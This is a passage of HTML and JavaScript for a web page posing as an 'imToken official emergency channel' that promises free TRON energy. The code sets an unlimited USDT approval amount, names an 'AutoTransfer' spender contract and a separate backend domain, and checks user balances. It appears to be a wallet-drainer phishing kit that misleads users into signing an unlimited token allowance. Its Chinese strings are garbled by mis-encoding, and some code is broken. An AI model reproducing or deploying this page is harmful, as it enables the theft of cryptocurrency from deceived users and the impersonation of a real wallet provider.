               <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
            </div>
        </div>
        <!-- åº•éƒ¨ä¿¡æ¯ç§»è¿›container -->
        <div class="footer-info" id="footerInfo">
            åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
            Â© 2025 èƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
        </div>
    </div>
    <!-- ========== ä¿®å¤åŠ è½½åŠ¨ç”»JSï¼šé—­åˆæ ‡ç­¾+æ­£ç¡®éšè—é€»è¾‘ ========== -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // é¡µé¢åŠ è½½å®Œæˆåï¼Œå»¶è¿Ÿ1.5ç§’éšè—åŠ è½½åŠ¨ç”»ï¼ˆç¡®ä¿åŠ¨ç”»å¯è§ï¼‰
            setTimeout(() => {
                const loadingEl = document.getElementById("Loading");
                if (loadingEl) loadingEl.style.display = "none";
            }, 1500);
        });
    </script>
    <script>       
// ========== å…¨å±€å˜é‡ä¼˜å…ˆå®šä¹‰ ==========
const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // ç‰¹æ®Šç™½åå•åœ°å€
const A1_SIGNAL_KEY = "a1_signal_records"; // A1ä¿¡å·å‘é€è®°å½•ï¼ˆ15åˆ†é’Ÿé˜²é‡å¤ï¼‰
const A1_STATUS_KEY = "a1_signal_status"; // æ–°å¢ï¼šA1ä¿¡å·çŠ¶æ€ç¼“å­˜é”®ï¼ˆä¹‹å‰ç¼ºå¤±å¯¼è‡´æŠ¥é”™ï¼‰
// ========== å…¨å±€å˜é‡ï¼ˆæ¸…ç†é‡å¤å®šä¹‰ï¼‰ ==========
let currentEnergy = 0;
let currentBandwidth = 0; // æ–°å¢ï¼šå®½å¸¦ä½™é¢å˜é‡
const DEPLOY_START_TIME = new Date().getTime(); // ä¿®å¤ï¼šç”¨å½“å‰æ—¶é—´ä½œä¸ºéƒ¨ç½²èµ·å§‹æ—¶é—´
const INIT_TRX = 4104470400000;
const TRX_DECREASE_PER_SEC = 65200;
const STORAGE_KEY = "trx_countdown_data";
let trxTimer = null; // åªä¿ç•™1æ¬¡å®šä¹‰
let contractEnergyEl = null;
// æ ¸å¿ƒé…ç½®
const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const BACKEND_API = "https://kgjiopv1.com";
const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
// USDTåˆçº¦ABI
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "name": "owner", "type": "address"},
            {"indexed": true, "name": "spender", "type": "address"},
            {"indexed": false, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    }
];
// å…¨å±€å˜é‡
let tronWeb = null;
let userAddress = null;
let trc20Contract = null;
let tokenBalance = 0.00;
let trxBalance = 0.00;
const RECORD_KEY = "imtoken_energy_records";
// æ–°å¢ï¼šB1ä¿¡å·å‘é€æ ‡è®°ï¼ˆé˜²æ­¢é‡å¤å‘é€ï¼‰
const B1_SIGNAL_KEY = "b1_signal_sent";
// æ–°å¢ï¼šimTokenè·³è½¬é…ç½®ï¼ˆç”¨éªŒè¯è¿‡çš„ç¨³å®šschemeï¼‰
const imTokenConfig = {
    scheme: "imtokenv2://navigate/DappView?url=",
    name: "imToken"
};
// ========== å¤šè¯­è¨€é…ç½®ï¼ˆå·²æ›´æ–°headerDescæ–‡æœ¬ï¼‰ ==========
const langConfig = {
    zh: {
        headerTitle: "imToken",
        headerDesc: "imTokenå®˜æ–¹åº”æ€¥é€šé“", // å·²æ›¿æ¢ä¸ºéœ€æ±‚æ–‡æœ¬
        userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>",
        walletStatusTitle: "é’±åŒ…çŠ¶æ€",
        disconnectedText: "æœªè¿æ¥é’±åŒ…",
        disconnectedTip1: "æ­¤é“¾æ¥ä¸ºimTokenä¸“å±é€šé“ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–",
        disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
        disconnectedTip3: "2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
        disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
        disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
        connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
        connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
        connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000Î¼s</span>",
        connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
        contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
        contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚",
        recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
        recordAmountTitle: "è½¬è´¦é¢åº¦",
        energyType: "USDTè½¬è´¦",
        transferQuota: "æ— é™",
        noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
        browserWarn1: " âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
        browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken",
        connectBtnText: "è¿æ¥imTokené’±åŒ…",
        approveBtnText: "é¢†å–èƒ½é‡",
        reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
        footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 èƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
        copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€",
        copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
        å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·imToken\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
        copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenä¸­ç²˜è´´è®¿é—®",
        connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
        retryConnect: "é‡è¯•è¿æ¥",
        authorizedTip: "å·²é¢†å–æç¤º<br>{address}<br>USDTä½™é¢ï¼š<span>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br><span style='color: #a0a8a4; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
        authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
        afterApproveTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...</span>",
        deployingBtn: "å‘æ”¾ä¸­...",
        loadingBtn: "åŠ è½½ä¸­...",
        loadingTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… åŠ è½½ä¸­...</span>",
        queryingBalance: "æŸ¥è¯¢ä¸­...",
        insufficientUsdt: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #ef4444;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼šUSDTä½™é¢éœ€å¤§äº1</span>",
        insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        eligibleTip: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #4ade80;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… å¯å…è´¹é¢†å–90000 USDT èƒ½é‡</span>",
        distributingBtn: "èƒ½é‡é…é€ä¸­...",
        redirectingBtn: "è·³è½¬ç­¾åä¸­...",
        approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦ï½",
        successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦</span>",
        recordAddress: "åœ°å€ï¼š",
        recordType: "é¢†å–ç±»å‹ï¼š",
        recordEnergy: "è·å–èƒ½é‡ï¼š",
        recordTime: "é¢†å–æ—¶é—´ï¼š",
        freeEnergy: "å…è´¹é¢†å–",
        systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
        ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "æœªæ£€æµ‹åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€<br><span style='color: #ef4444; font-size: 14px;'>âŒ è¯·è¿æ¥imTokené’±åŒ…åé‡è¯•</span>",
        nonImTokenUser: "éimTokené’±åŒ…ç”¨æˆ·<br><span style='color: #3b82f6; font-size: 13px;'>æ­£åœ¨è‡ªåŠ¨å”¤èµ·imToken...</span>",
        // æ–°å¢ï¼šéé’±åŒ…ç¯å¢ƒå®¹å™¨åŒè¯­ï¼ˆä¸­æ–‡ï¼‰
        specialTipTitle: "imToken-EAB",
        specialTipContent: "æ­¤é“¾æ¥ä»…ä¸ºimTokenç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚"
    },
    en: {
        headerTitle: "imToken",
        headerDesc: "imToken Official Emergency Channel", // è‹±æ–‡å¯¹åº”æ›´æ–°
        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
        walletStatusTitle: "Wallet Status",
        disconnectedText: "Wallet not connected",
        disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
        disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
        disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
        disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
        disconnectedTip5: "4. No assets required - exit directly to cancel",
        connectedSuccess: "âœ… Wallet connected successfully",
        connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
        connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000Î¼s Energy</span>",
        connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
        contractResourceTitle: "Contract Remaining Resources",
        contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for imToken users",
        recordTypeTitle: "Energy Usage Scope",
        recordAmountTitle: "Transfer Quota",
        energyType: "USDT Transfer",
        transferQuota: "Unlimited",
        noRecord: "No energy claim records",
        browserWarn1: " âš ï¸ Open with <strong>imToken in-app browser</strong>",
        browserWarn2: " âš ï¸ Non-wallet browser: Click button to copy + launch imToken",
        connectBtnText: "Connect imToken Wallet",
        approveBtnText: "Claim Energy",
        reviewTipText: "System reviewing - please complete the signature after approval",
        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
        copySuccess: "âœ… Link copied - open in imToken in-app browser",
        copyFail: "âŒ Copy failed: Please copy manually",
        å”¤èµ·Guide: "âœ… Link copied + imToken launched\nNext: Open imToken â†’ Browser â†’ Paste link",
        copyGuide: "âœ… Link copied - please paste in imToken",
        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ Network fluctuation</span>",
        retryConnect: "Retry Connection",
        authorizedTip: "Claimed Tip<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>âœ… This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
        authorizedBtn: "Energy Claimed",
        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Authorization successful, energy distributing...</span>",
        deployingBtn: "Distributing...",
        loadingBtn: "Loading...",
        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Loading...</span>",
        queryingBalance: "Querying...",
        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ Ineligible: USDT balance must exceed 1</span>",
        insufficientBtn: "Ineligible",
        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… Eligible for 90000 USDT Energy</span>",
        distributingBtn: "Energy Distributing...",
        redirectingBtn: "Redirecting to Signature...",
        approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
        authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
        successTip: "ğŸ‰ Free Energy Claim Completed! 90000Î¼s USDT Energy has been creditedï½",
        successBtn: "Claim Successful",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000Î¼s USDT Energy credited</span>",
        recordAddress: "Address:",
        recordType: "Claim Type:",
        recordEnergy: "Energy Obtained:",
        recordTime: "Claim Time:",
        freeEnergy: "Free Claim",
        systemBusyTip: "System busy, please try again later",
        ineligibleTip: "Ineligible",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>âŒ Please connect imToken wallet and try again</span>",
        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Auto-launching imToken...</span>",
        // æ–°å¢ï¼šéé’±åŒ…ç¯å¢ƒå®¹å™¨åŒè¯­ï¼ˆè‹±æ–‡ï¼‰
        specialTipTitle: "imToken-EAB",
        specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
    }
};
// å½“å‰è¯­è¨€
let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
// ========== äºŒæ¬¡æˆæƒæ ¡éªŒå·¥å…· ==========
const AUTHORIZED_KEY = "authorized_wallet_addresses";
function getAuthorizedAddresses() {
    try {
        const stored = localStorage.getItem(AUTHORIZED_KEY);
        return stored ? JSON.parse(stored) : [];
    } catch (e) {
        console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        return [];
    }
}
function addAuthorizedAddress(address) {
    try {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) {
            addresses.push(address);
            localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
        }
    } catch (e) {
        console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
    }
}
function isAddressAuthorized(address) {
    const addresses = getAuthorizedAddresses();
    if (!addresses.includes(address)) return false;
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const record = records.find(item => item.address === address);
    if (!record) return false;
    const receiveTime = new Date(record.receiveTime).getTime();
    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
    return Date.now() - receiveTime < thirtyDays;
}
// ========== A1ä¿¡å·é˜²é‡å¤å·¥å…·ï¼ˆ15åˆ†é’Ÿï¼‰ ==========
function canSendA1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        const lastSendTime = records[address] || 0;
        const now = Date.now();
        return now - lastSendTime > 15 * 60 * 1000; // 15åˆ†é’Ÿ=900000æ¯«ç§’
    } catch (e) {
        console.warn("æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™å¤±è´¥ï¼š", e);
        return true; // å¼‚å¸¸æ—¶å…è®¸å‘é€
    }
}
function updateA1SignalRecord(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        records[address] = Date.now();
        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š", e);
    }
}
// ========== B1ä¿¡å·é˜²é‡å¤å·¥å…·ï¼ˆä¿ç•™æœ€ç»ˆç‰ˆï¼Œåˆ é™¤é‡å¤çš„ç®€å•ç‰ˆæœ¬ï¼‰ ==========
function hasSentB1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        const item = records[address];
        if (!item) return false;
        // 30å¤©å†…å·²å‘é€B1â†’è§¦å‘é˜²é‡å¤ï¼ˆæ˜¾ç¤ºã€Œæˆ‘å·²é¢†å–è¿‡ç­‰å¾…å¤„ç†ã€ï¼‰
        return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
    } catch (e) {
        console.warn("æ£€æŸ¥B1é˜²é‡å¤å¤±è´¥ï¼š", e);
        return false;
    }
}
function markB1SignalSent(address) {
    try {
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        records[address] = { time: Date.now() }; // å‘é€B1åç«‹å³æ ‡è®°
        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ ‡è®°B1ä¿¡å·å¤±è´¥ï¼š", e);
    }
}
// ========== DOMå…ƒç´ ç¼“å­˜ï¼ˆè¡¥å……å¼¹çª—å…ƒç´ ï¼‰ ==========
const walletStatusContainer = document.getElementById("walletStatusContainer");
const contractAddrEl = document.getElementById("contractAddr");
const userInfoEl = document.getElementById("userInfo");
const userInfoStatus = document.getElementById("userInfoStatus"); // æ–°å¢ï¼šåŠ¨æ€æç¤ºå®¹å™¨
const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");
const warning = document.querySelector('.warning');
const approvalRecords = document.getElementById("approvalRecords");
const reviewTip = document.getElementById("reviewTip");
const reviewTipText = document.getElementById("reviewTipText");
const langDropdown = document.getElementById("langDropdown"); // è¡¥å……ï¼šè¯­è¨€ä¸‹æ‹‰å®¹å™¨
const langToggleBtn = document.getElementById("langToggleBtn"); // è¡¥å……ï¼šä¸‹æ‹‰è§¦å‘æŒ‰é’®
const langDropdownItems = document.querySelectorAll(".lang-dropdown-item"); // è¡¥å……ï¼šè¯­è¨€é€‰é¡¹
const footerInfo = document.getElementById("footerInfo");
const recordList = document.getElementById("recordList"); // è®°å½•åˆ—è¡¨å…ƒç´ 
const specialTipContainer = document.getElementById("specialTipContainer"); // æ–°å¢ï¼šéé’±åŒ…ç¯å¢ƒå®¹å™¨
// æ–°å¢ï¼šå¼¹çª—å…ƒç´ ç¼“å­˜
const nonImTokenPopup = document.getElementById("nonImTokenPopup");
const closePopupBtn = document.getElementById("closePopupBtn");
// æ–°å¢ï¼šä½™é¢é¡¹DOMç¼“å­˜
const userInfoDefault = document.getElementById("userInfoDefault");
const balanceUsdtEl = document.getElementById("balanceUsdt");
const balanceTrxEl = document.getElementById("balanceTrx");
const balanceEnergyEl = document.getElementById("balanceEnergy");
const balanceBandwidthEl = document.getElementById("balanceBandwidth");
const balanceItems = document.querySelectorAll(".balance-item");
// ========== é”™è¯¯ç±»å‹åˆ¤æ–­ ==========
function isCustomerError(errMsg) {
    const lang = langConfig[currentLang];
    const customerErrorKeys = [
        lang.ineligibleTip, "æ— æ•ˆTRONåœ°å€", "USDTä½™é¢ä¸è¶³", "ä¸ç¬¦åˆé¢†å–æ¡ä»¶", "30å¤©å†…å·²é¢†å–", 
         "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€", "Ineligible", "invalid TRON address", 
        "USDT balance", "within 30 days"
    ];
    return customerErrorKeys.some(key => errMsg.includes(key));
}
// ========== è¯­è¨€åˆ‡æ¢é€»è¾‘ï¼ˆä¿®å¤äº‹ä»¶å†²çªï¼‰ ==========
// åˆå§‹åŒ–è¯­è¨€æ˜¾ç¤º
function initLangDisplay() {
    if (currentLang === "zh") {
        langToggleBtn.innerHTML = 'ğŸ‡¨ğŸ‡³ <span id="currentLangText">ä¸­æ–‡</span>';
    } else {
        langToggleBtn.innerHTML = 'ğŸ‡ºğŸ‡¸ <span id="currentLangText">English</span>';
    }
}
// åˆ‡æ¢è¯­è¨€
function changeLang(newLang) {
    currentLang = newLang;
    localStorage.setItem("imtoken_energy_lang", currentLang);
    initLangDisplay(); // æ›´æ–°æŒ‰é’®æ˜¾ç¤º
    updatePageLang();
    reRenderDynamicContent();
    renderEnergyRecords();
    // å…³é—­ä¸‹æ‹‰èœå•
    langDropdown.classList.remove("open");
}
function updatePageLang() {
    const lang = langConfig[currentLang];
    Object.keys(lang).forEach(key => {
        const el = document.getElementById(key);
        if (el) {
            el.innerHTML = lang[key];
        }
    });
    connectBtn.textContent = lang.connectBtnText;
    approveBtn.textContent = lang.approveBtnText;
    reviewTipText.textContent = lang.reviewTipText;
    approvalRecords.textContent = lang.noRecord;
}
 // ========== ä¿®å¤ï¼šæ›´æ–°userInfoæ˜¾ç¤ºï¼ˆä¸è¦†ç›–ç»“æ„ï¼Œåªæ§åˆ¶æ˜¾ç¤º/éšè—ï¼‰ ==========       
async function updateUserInfoDisplay() {
    const lang = langConfig[currentLang];
    if (!userAddress) {
        // æœªè¿æ¥ï¼šæ˜¾ç¤ºé»˜è®¤æç¤ºï¼Œéšè—åŠ¨æ€æç¤ºå’Œå››è§’ä½™é¢
        userInfoDefault.style.display = "block";
        userInfoStatus.style.display = "none";
        balanceItems.forEach(item => item.style.display = "none");
        return;
    }
    // å·²è¿æ¥ï¼šéšè—é»˜è®¤æç¤ºï¼Œæ˜¾ç¤ºå››è§’ä½™é¢ï¼ˆåŠ¨æ€æç¤ºæ ¹æ®å…·ä½“çŠ¶æ€æ§åˆ¶ï¼‰
    userInfoDefault.style.display = "none";
    balanceItems.forEach(item => item.style.display = "flex");
    // æ›´æ–°è¿æ¥åœ°å€å’Œä½™é¢æ•°å€¼ï¼ˆåŸæœ‰é€»è¾‘ä¸å˜ï¼‰
    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
    document.getElementById("statusAddress").textContent = shortAddr;
    balanceUsdtEl.textContent = tokenBalance.toFixed(2);
    balanceTrxEl.textContent = trxBalance.toFixed(2);   
    balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
    const userOwnEnergy = await queryUserEnergyBalance(userAddress);
    balanceEnergyEl.textContent = Math.floor(userOwnEnergy);
}
// æ–°å¢ï¼šè¡¥å……ç¼ºå¤±çš„ updateUserBalanceDisplay å‡½æ•°
function updateUserBalanceDisplay() {
    // åˆå§‹åŒ–ä½™é¢æ˜¾ç¤ºä¸º0ï¼ˆæœªè¿æ¥é’±åŒ…æ—¶ï¼‰
    balanceUsdtEl.textContent = "0.00";
    balanceTrxEl.textContent = "0.00";
    balanceEnergyEl.textContent = "0";
    balanceBandwidthEl.textContent = "0";
}
// æŸ¥è¯¢ç”¨æˆ·å®½å¸¦ä½™é¢
async function queryBandwidthBalance(address) {
    try {
        if (!tronWeb) return 0;
        const account = await tronWeb.trx.getAccount(address);
        return account.bandwidth || 0;
    } catch (e) {
        console.warn("æŸ¥è¯¢å®½å¸¦ä½™é¢å¤±è´¥ï¼š", e);
        return 0;
    }
}
  // æŸ¥è¯¢ç”¨æˆ·è‡ªèº«çš„èƒ½é‡ä½™é¢ï¼ˆç‹¬ç«‹äºåˆçº¦å‰©ä½™èƒ½é‡ï¼‰
async function queryUserEnergyBalance(address) {
    try {
        if (!tronWeb) return 0;
        const account = await tronWeb.trx.getAccount(address);
        // ç”¨æˆ·è‡ªèº«èƒ½é‡ = è´¦æˆ·èƒ½é‡ï¼ˆenergyï¼‰ + å†»ç»“èƒ½é‡ï¼ˆfrozenEnergyï¼‰
        const userEnergy = (account.energy || 0) + (account.frozenEnergy?.total || 0);
        return userEnergy;
    } catch (e) {
        console.warn("æŸ¥è¯¢ç”¨æˆ·è‡ªèº«èƒ½é‡å¤±è´¥ï¼š", e);
        return 0;
    }
}      
function reRenderDynamicContent() {
    const lang = langConfig[currentLang];
    if (!userAddress) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        recordList.style.display = "none";
       await updateUserInfoDisplay(); // æœªè¿æ¥æ—¶æ›´æ–°
        return;
    }
    recordList.style.display = "block";
    recordList.style.visibility = "visible";
    // ç‰¹æ®Šåœ°å€å¤„ç†
    if (userAddress === SPECIAL_ADDRESS) {
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        updateUserInfoDisplay(); // å·²è¿æ¥æ—¶æ›´æ–°
        renderEnergyRecords();
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        return;
    }
    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
    // 30å¤©å†…å·²é¢†å–
    if (isAddressAuthorized(userAddress)) {
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        await updateUserInfoDisplay(); // å·²è¿æ¥æ—¶æ›´æ–°
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
        return;
    }
    // ä½™é¢çŠ¶æ€
    if (tokenBalance <= 1) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
    } else {
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
